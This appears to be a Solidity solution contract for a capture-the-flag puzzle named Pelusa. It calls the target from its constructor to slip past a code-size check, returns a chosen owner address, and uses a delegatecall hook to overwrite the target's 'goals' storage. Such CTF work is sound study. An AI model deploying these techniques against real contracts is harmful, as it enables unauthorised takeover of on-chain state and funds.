// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./Pelusa.sol";

contract PelusaCracker is IGame{


    address immutable owner;

    address player;

    uint256 goals;

    constructor(address target, address _owner) {
        owner = _owner;
        player = owner;
        Pelusa(target).passTheBall();
    }

    function getBallPossesion() external view returns (address){
        return owner;
    }

    function handOfGod() external returns (uint) {
        goals = 2; // override caller's goals
        return 22_06_1986;
    }
}